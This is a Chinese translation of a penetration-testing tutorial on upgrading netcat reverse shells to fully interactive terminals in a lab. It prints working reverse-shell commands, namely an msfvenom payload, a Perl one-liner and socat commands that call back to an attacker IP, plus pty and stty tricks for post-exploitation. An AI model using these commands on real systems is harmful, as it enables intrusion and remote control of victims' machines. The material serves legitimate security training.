# 技术分享：将普通Shell升级为全交互式终端

##### 译文声明
本文是翻译文章，原文来源：ropnop.com
原文地址：[链接]
译文仅供参考，具体内容表达及含义以原文为准。
译者：[牧野之鹰](http://bobao.360.cn/member/contribute?uid=877906634)
预估稿费：170RMB
投稿方式：发送邮件至linwei#360.cn，或登录网页版在线投稿

对于每一位渗透测试人员来说，当通过netcat接收到反弹回来的反向shell时，那种成就感难以言喻。然而，他们可能也经历过因执行错误命令导致连接中断的沮丧时刻。

除了处理技术不当外，这些“简单”的shell还存在以下问题：
- 部分命令（如su、ssh）需要合适的终端才能运行。
- 标准错误信息（STDERR）通常不会显示。
- 文本编辑器（如VIM）无法正常工作。
- 缺乏命令自动补全功能。
- “上”键没有历史记录功能。
- 不支持任务管理。
- 等等...

虽然这些shell相对容易设置和捕获，但在一个完全交互式的终端（TTY）中操作会更加理想。本文将介绍几种有效的方法来“升级”这些简单的shell，使其具有更多功能。

### 参考资源
- [Pentest Monkey – Post Exploitation Without a TTY](http://pentestmonkey.net/blog/post-exploitation-without-a-tty)
- [Phineas Fisher Hacks Catalan Police Union Website](https://www.youtube.com/watch?v=oI_ZhFCS3AQ#t=25m53s)
- [Phineas Fisher – Hackingteam Writeup](http://pastebin.com/raw/0SNSvyjJ)

### 实验环境
- 受害者 IP: 10.0.3.7
- 攻击者 KALI IP: 10.0.3.4

### 生成反向shell命令
传统方法使用netcat获取反向shell，但并非所有服务器都安装了netcat，且版本不同可能导致某些参数不可用。这里推荐使用Metasploit的msfvenom工具来生成命令。例如：

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.3.4 LPORT=4444 -f raw
```

或者使用Perl单行脚本来替代：

```perl
perl -e 'use Socket;$i="10.0.3.4";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 方法一：使用Python pty模块
在获得了一个简单的shell后，可以利用Python加载pty模块来创建伪终端，从而欺骗一些命令以为它们在一个适当的环境中执行。具体命令如下：

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

这能够解决部分问题，但仍然缺乏完整的交互功能。

### 方法二：使用socat
[socat](http://www.dest-unreach.org/socat/doc/socat.html)是一个强大的网络工具，可以用来建立全功能的TTY。如果受害者机器上已安装socat，可以通过以下命令启动一个完全交互式的反向shell：

**Kali (监听端口):**
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
```

**受害者 (发起连接):**
```bash
socat TCP:10.0.3.4:4444 EXEC:bash,pty,stderr,setsid,sigint,sane
```

若未安装socat，可以从GitHub下载独立二进制文件，并通过命令注入漏洞上传到受害者服务器上。

### 方法三：魔术般地升级Netcat
从Phineas Fisher的视频中学到的一种技巧，只需调整Kali终端内的stty参数即可将简单netcat shell升级为完整TTY。步骤如下：

1. 使用Python加载PTY模块；
2. 将shell置于后台(`Ctrl-Z`)；
3. 检查当前终端类型和窗口大小；
4. 设置stty为原始模式并开启回显；
5. 将shell恢复到前台(`fg`)并重置终端(`reset`)；
6. 调整终端类型与窗口大小。

最终结果是一个具备命令补全、历史记录等功能的完全交互式TTY。

希望上述内容对您有所帮助！